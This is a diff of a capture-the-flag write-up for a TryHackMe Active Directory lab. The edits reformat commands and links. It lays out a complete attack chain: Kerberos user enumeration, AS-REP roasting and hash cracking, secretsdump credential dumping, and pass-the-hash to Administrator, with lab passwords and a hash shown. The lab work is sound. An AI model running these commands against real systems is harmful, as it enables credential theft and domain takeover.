@@ -2,10 +2,11 @@
 
 ## Welcome to Attacktive Directory
 
-As ususual, we start off with an [nmap](nmap.md) scan. Our target IP address is 10.10.177.198.
+As ususual, we start off with an nmap scan. Our target IP address is 10.10.177.198.
 
 ```bash
-sudo nmap -v -oA attacktive-directory -Pn -A -T4 -sS -script vuln -p- 10.10.177.198
+sudo nmap -v -oA attacktive-directory -Pn -A -T4 -sS \
+          -script vuln -p- 10.10.177.198
 ```
 
 This gives us the following results.
@@ -97,7 +98,7 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Thu Dec 30 20:48:05 2021 -- 1 IP address (1 host up) scanned in 1890.41 seconds
 ```
 
-We'll [use enum4linux to gather some additional information from the Samba shares](enumerate-samba-users-and-shares.md) (139/445) on the target.
+We'll use enum4linux to gather some additional information from the Samba shares (139/445) on the target.
 
 ```bash
 enum4linux 10.10.177.198
@@ -430,10 +431,13 @@ The AD domain itself is using the standard (invalid) .local TLD, but that's not 
 
 ## Enumerating Users via Kerberos
 
-We'll now try to enumerate users using [Kerbrute](kerbrute.md) and the [provided user list](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt).
+We'll now try to enumerate users using Kerbrute and the provided user list.
 
 ```bash
-kerbrute userenum --dc 10.10.177.198 --domain spookysec.local --output attacktive-director.kerbrute userlist.txt
+kerbrute userenum --dc 10.10.177.198 \
+                  --domain spookysec.local \
+                  --output attacktive-director.kerbrute \
+                           userlist.txt
 ```
 
 This produces the following output.
@@ -473,7 +477,7 @@ We'll be targeting the `svc-admin` and `backup` accounts. (These are supposed to
 
 ## Abusing Kerberos
 
-We're going to try [AS-REP Roasting](kerberos.md) using [Impacket](impacket.md)'s GetNPUsers.py script. We first create an `attacktive-directory.targets` file containing the following:
+We're going to try AS-REP Roasting using Impacket's GetNPUsers.py script. We first create an `attacktive-directory.targets` file containing the following:
 
 ```
 svc-admin
@@ -483,34 +487,41 @@ backup
 Then, we feed this to the GetNPUsers.py script.
 
 ```bash
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -outputfile attacktive-directory.getnpusers -usersfile attacktive-directory.targets -dc-ip 10.10.177.198 spookysec.local/
+python3 \
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py \
+-outputfile attacktive-directory.getnpusers \
+-usersfile attacktive-directory.targets \
+-dc-ip 10.10.177.198 spookysec.local/
 ```
 
-GetNPUsers.py reports that `backup` isn't vulnerable to AS-REP roasting, but `svc-admin` *is* vulnerable and we get back a valid 
-[hashcat](hashcat.md) password hash.
+GetNPUsers.py reports that `backup` isn't vulnerable to AS-REP roasting, but `svc-admin` *is* vulnerable and we get back a valid hashcat password hash.
 
-A quick lookup in the hashcat [Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) wiki page shows that this is a "Kerberos 5, etype 23, AS-REP" hash (hashcat mode 18200). We'll crack this using the [provided password list](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt).
+A quick lookup in the hashcat example hashes wiki page shows that this is a "Kerberos 5, etype 23, AS-REP" hash (hashcat mode 18200). We'll crack this using the provided password list.
 
 ```bash
-hashcat -m 18200 -O attacktive-directory.getnpusers passwordlist.txt
+hashcat -m 18200 \
+        -O attacktive-directory.getnpusers \
+           passwordlist.txt
 ```
 
 This reveals that the password for the `svc-admin` account is `management2005`.
 
-Before moving on, we'll connect to the target as `svc-admin` using [XFreeRDP](xfreerdp.md) to get the first flag.
+Before moving on, we'll connect to the target as `svc-admin` using XFreeRDP to get the first flag.
 
 ```bash
-xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.177.198 /u:svc-admin /p:management2005
+xfreerdp /dynamic-resolution +clipboard /cert:ignore \
+         /v:10.10.177.198 /u:svc-admin /p:management2005
 ```
 
 This flag is in a file called `user.txt` on `svc-admin`'s desktop.
 
 ## Back to the Basics
 
-We're going to drop down and [use smbclient to enumerate potential shares](enumerate-samba-users-and-shares.md) on the target. This is where the NetBIOS domain name we discovered above comes in handy (we need to supply it with the `-L` switch).
+We're going to drop down and use smbclient to enumerate potential shares on the target. This is where the NetBIOS domain name we discovered above comes in handy (we need to supply it with the `-L` switch).
 
 ```bash
-smbclient -L THM-AD -I 10.10.177.198 -U svc-admin%management2005
+smbclient -L THM-AD -I 10.10.177.198 \
+          -U svc-admin%management2005
 ```
 
 Which gives us the following output.
@@ -536,7 +547,8 @@ The contents of this file naively appear to be base64 encoded, and indeed piping
 We'll again pause to connect to the target as `backup` to get the second flag.
 
 ```bash
-xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.177.198 /u:backup /p:backup2517860
+xfreerdp /dynamic-resolution +clipboard /cert:ignore \
+         /v:10.10.177.198 /u:backup /p:backup2517860
 ```
 
 This flag is in a file called `PrivEsc` on `backup`'s desktop.
@@ -546,15 +558,20 @@ This flag is in a file called `PrivEsc` on `backup`'s desktop.
 The CTF now reveals that the `backup` account has all AD changes synced to it, including NT hashes, and that we can use Impacket's secretsdump.py file to obtain these from NTDS.DIT.
 
 ```bash
-python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip 10.10.177.198 -target-ip 10.10.177.198 spookysec.local/backup:backup2517860@THM-AD
+python3 \
+/usr/share/doc/python3-impacket/examples/secretsdump.py \
+-dc-ip 10.10.177.198 \
+-target-ip 10.10.177.198 \
+spookysec.local/backup:backup2517860@THM-AD
 ```
 
 (I got a bit tripped up here, as I didn't read secretsdump.py's output carefully enough -- credentials are presented in the format `domain\uid:rid:lmhash:nthash`, so the relevant NTLM hash is the *last* hash for the `Administrator` account!)
 
-We'll use the Evil-WinRM tool to retrieve the final flag by [passing the hash](https://en.wikipedia.org/wiki/Pass_the_hash).
+We'll use the Evil-WinRM tool to retrieve the final flag by passing the hash.
 
 ```bash
-evil-winrm --ip 10.10.177.198 --user Administrator --hash 0e0363213e37b94221497260b0bcb4fc
+evil-winrm --ip 10.10.177.198 --user Administrator \
+           --hash 0e0363213e37b94221497260b0bcb4fc
 ```
 
 The final flag is in a file called `root.txt` on the `Administrator` account's desktop.
@@ -565,7 +582,18 @@ ELAPSED TIME: 2 h 38 min
 
 * [TryHackMe: Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
 * [Kerberoasting initial: AS-REP Roasting](https://blog.certcube.com/as-rep-roasting-attack/)
-* [Pass the hash](https://en.wikipedia.org/wiki/Pass_the_hash)
+* [Using “nmap”](nmap.md)
+* [Enumerate Samba Users and Shares](enumerate-samba-users-and-shares.md)
+* [Using Kerbrute](kerbrute.md)
+* [attacktive-directory-tools / userlist.txt](https://github.com/Sq00ky/attacktive-directory-tools/blob/master/userlist.txt)
+* [Kerberos](kerberos.md)
+* [Using Impacket](impacket.md)
+* [Using Hashcat](hashcat.md)
+* [hashcat: Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
+* [attacktive-directory-tools / passwordlist.txt](https://github.com/Sq00ky/attacktive-directory-tools/blob/master/passwordlist.txt)
+* [Using XFreeRDP](xfreerdp.md)
+* [Enumerate Samba Users and Shares](enumerate-samba-users-and-shares.md)
+* [Pass the hash (Wikipedia)](https://en.wikipedia.org/wiki/Pass_the_hash)
 
 - - - -
 
